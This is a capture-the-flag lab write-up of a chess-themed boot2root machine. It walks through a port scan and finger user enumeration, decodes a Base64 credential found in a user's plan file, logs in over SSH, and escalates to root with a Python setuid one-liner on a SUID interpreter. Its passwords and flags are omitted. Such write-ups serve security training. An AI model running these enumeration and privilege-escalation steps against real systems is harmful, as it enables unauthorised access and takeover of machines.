#Boot2root
```Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

NullRook prowls a smart chessboard hub where automation meets strategy. In the digital workshop, subtle flaws in the robot interface threaten to tip the balance of play.
```

IP_Addresses
```IP_Addresses
Attack Box = 10.10.197.99
Target Machine = 10.10.142.93
```
Start `RustScan` on `Attack IP-Address` 
```Output 
rustscan -a 10.10.142.93
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
79/tcp open  finger  syn-ack
80/tcp open  http    syn-ack
```
On `Port 80` we got 
``` 
Board-001 (Club Room) Online
Board-002 (Magnus\u2019 Lab) Online
Board-003 (Streaming Rig) Offline
Board-004 (Fabiano\u2019s Testbench) Online 
```
usernames `Magnus` & `Fabiano` & `Hikaru`, With `Rustscan` we discovered about `Port 79` which is running `finger`  protocol which is an older or old protocol
```bash 
finger @10.10.142.93
Login     Name       Tty      Idle  Login Time   Office     Office Phone
fabiano              pts/0      10  Jun 27 21:11 (10.10.197.99)
fabiano              pts/1          Jun 27 21:23 (10.10.197.99)
```

and which gives us hint and we attempt 
```bash 
finger fabiano@10.10.142.93
Login: fabiano        			            Name: 
Directory: /home/fabiano            	Shell: /bin/bash
On since Fri Jun 27 21:11 (UTC) on pts/0 from 10.10.197.99
   12 minutes 1 second idle
On since Fri Jun 27 21:23 (UTC) on pts/1 from 10.10.197.99
   1 minute 31 seconds idle
No mail.
Project:
Reminders
Plan:
[credential blob omitted]
```
This `[credential blob omitted]` obviously a cipher text which we encoded in `Base64`
and which result decoded as `fabiano:[password omitted]`
which is also be used as `SSH` login and BOOM 
```bash 
ssh fabiano@10.10.142.93
passowrd = [password omitted]
login successfully```

```bash 
ls 
user.txt
cat user.txt 
[flag omitted]
```
User Flag 
```Flag 
[flag omitted]
```

check system Configuration and got 
`find / -perm -4000 -type f 2>/dev/null`
```bash 
whoami
fabiano
fabiano@tryhackme-2204:~$ id
uid=1003(fabiano) gid=1003(fabiano) groups=1003(fabiano)
fabiano@tryhackme-2204:~$ find / -perm -4000 -type f 2>/dev/null
/tmp/rootsh
/dev/shm/rootsh
```


```bash 
find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/mount
```

Iqlip's Help 
we got to know 
```bash 
which python3 
/var/bin/python3 
python3 --version
Python 3.10.12
```

#Python3_SUID_Root

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Got the root shell 
```bash
cat root.txt 
[flag omitted]
```